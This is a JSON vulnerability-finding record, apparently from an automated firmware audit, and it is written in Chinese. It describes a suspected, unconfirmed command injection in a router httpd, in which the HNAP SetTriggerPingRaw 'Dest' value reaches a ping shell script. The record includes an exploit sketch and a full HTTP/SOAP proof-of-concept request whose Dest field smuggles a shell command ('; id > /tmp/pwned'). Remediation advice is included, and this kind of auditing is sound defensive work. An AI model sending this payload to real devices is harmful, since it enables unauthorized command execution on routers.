@@ -1,0 +1,32 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "HNAP SetTriggerPingRaw 的 Dest 经 csman 配置落盘后进入 ping-action shell 命令构造（二次注入面，证据链未闭合）",
+  "severity": "high",
+  "confidence": 0.35,
+  "vuln_class": "命令注入",
+  "cwe": "CWE-78",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 的 HNAP 动作 SetTriggerPingRaw（process_SetTriggerPingRaw_action, sub_4B70F0 @0x4B70F0）与 SetTriggerPing（sub_4B6820 @0x4B6820）把 HNAP 键 Dest 的值（snprintf 上限 132 字节、无字符过滤）经 write_csman_str 写入 csman 配置库（CSID -2146107387），随后通过 exec_cmd 启动 /usr/bin/ping-action。该脚本为 /bin/sh 实现，start 分支中 TARGET=`rdcsman 0x80150005 str`，并构造 IF_ARGS=\"-n $IF_NAME\"、SRC_ARGS=\"-I $SRC_IP\"，最终执行 ping -c 4 \"$TARGET\" $IF_ARGS $SRC_ARGS；其中 $IF_ARGS/$SRC_ARGS 未加引号展开，TARGET 亦被写入 logger 的双引号字符串中二次展开，构成配置落盘→shell 执行的二次注入面。本条证据链存在缺口：httpd 写入的 CSID 与脚本读取的 CSID 是否同一（0x80150005）未在静态层面闭合，因此按低置信度记录，需在模拟环境实测确认。",
+  "evidence": [
+    "httpd @0x4B70F0 反汇编级伪 C：键 \"Dest\" 命中时 snprintf(v18,132,\"%s\",*v6)（无字符白名单），随后 write_csman_str(csid,-2146107387,v18) 落盘配置；紧接着 exec_cmd(...,\"ping-action start \") 启动外部脚本，形成标准的二次注入（stored → 执行）链路",
+    "httpd @0x4B6820（process_SetTriggerPing_action）同样处理键 \"Dest\"：snprintf(v20,132,\"%s\",v7) → write_csman_str(-2146107387,v20) → exec_cmd(\"ping-action start \")",
+    "usr/bin/ping-action 脚本 start 分支：TARGET=`rdcsman 0x80150005 str`；IF_ARGS=\"-n $IF_NAME\"、SRC_ARGS=\"-I $SRC_IP\"，最终执行 ping -c 4 \"$TARGET\" $IF_ARGS $SRC_ARGS —— $IF_ARGS/$SRC_ARGS 未加引号展开，若其来源字符串含空格或 shell 元字符将按词/按命令解析",
+    "httpd 的 process_method_hnap(sub_4084AC @0x4084AC) 与 HNAP 动作派发表（.data 0x4EE050、.rodata 0x4C4840）中未见针对 SetTriggerPing* 的独立鉴权分支",
+    "待确认项（本条证据链缺口）：write_csman_str 写入的 CSID -2146107387 是否即 ping-action 读取的 0x80150005（Dest 的 CSID 映射未在静态层面闭合）；$IF_NAME 的来源 CSID 0x8000F301/0x8001000b/0x009300c* 的可控性同样待确认"
+  ],
+  "session_id": "s-mudkqaoe-70ee",
+  "function_name": "sub_4B70F0",
+  "preconditions": "httpd(80/tcp) 可达；需能派发 HNAP SetTriggerPingRaw/SetTriggerPing 动作；命令注入的最终触发依赖 ping-action 脚本读取的 CSID（0x80150005 / IF_NAME 系列）与 httpd 写入的 CSID（-2146107387 / -2146107088）确为同一存储位置。该映射关系未在静态层面确认，故本条按低置信度入库。",
+  "exploit_sketch": "1) HNAP 动作 SetTriggerPingRaw，字段 Trigger=true、Dest=`<注入串>`、IPGeneration=IPv4；httpd 将 Dest 存入 csman 并执行 `ping-action start`。2) 若 Dest 的 CSID 与脚本读取的 0x80150005 一致，脚本以 TARGET 取值；TARGET 虽被双引号包裹，但其值同时出现在 `logger -t \"ping\" \"ping -c 4 \\\"$TARGET\\\" $IF_ARGS -I $SRC_IP ...\"` 中（双引号内二次展开），含 \\\" 或多重引号的值可越出引号边界。3) 更直接面：若 IF_NAME/SRC_IP 来源 CSID 可由其他 HNAP 动作写入，则无引号展开的 $IF_ARGS/$SRC_ARGS 直接形成命令注入。4) 落地验证建议：模拟环境内写入 Dest 后触发 ping-action start，观察 /var/run/ping_result 与进程表。",
+  "remediation": "1) ping-action 脚本内对所有参与命令构造的配置值加引号并做白名单校验（目标地址仅允许 IP/域名，接口名仅允许 ifconfig 可见的接口名），特别是 IF_ARGS/SRC_ARGS 必须整体作为单个参数传递。2) httpd 侧在写入 Dest/IPGeneration 前用 inet_pton/resolv 校验，拒绝含空格、引号、; ` $ ( ) | & 的取值。3) 引入 execve 参数数组替代 shell 字符串拼接。4) HNAP SetTriggerPing* 增加会话与 CSRF 校验，并限制诊断功能仅 LAN 侧可达。",
+  "poc": "POST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://purenetworks.com/HNAP1/SetTriggerPingRaw\"\nContent-Length: <len>\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SetTriggerPingRaw xmlns=\"http://purenetworks.com/HNAP1/\">\n      <Trigger>true</Trigger>\n      <Dest>127.0.0.1; id > /tmp/pwned; #</Dest>\n      <IPGeneration>IPv4</IPGeneration>\n    </SetTriggerPingRaw>\n  </soap:Body>\n</soap:Envelope>\n\n（同时观察 /var/run/ping_result 生成、以及 csman CSID 0x80150005 的实际取值以确认映射）",
+  "call_chain": "80/tcp HTTP (IN-003) → httpd HNAP 分发 process_method_hnap @0x4084AC → SetTriggerPingRaw_put sub_4B73D8 @0x4B73D8 → process_SetTriggerPingRaw_action sub_4B70F0 @0x4B70F0（提取 HNAP 键 Dest → snprintf(v18,132,\"%s\") → write_csman_str(-2146107387, v18)）→ exec_cmd(\"ping-action start \") → /usr/bin/ping-action（shell 脚本 start 分支）→ TARGET=`rdcsman 0x80150005 str` → ping -c 4 \"$TARGET\" $IF_ARGS $SRC_ARGS",
+  "function_addr": "0x4b70f0",
+  "id": "F-mudl82su-a79f",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T04:13:09Z",
+  "history": []
+}
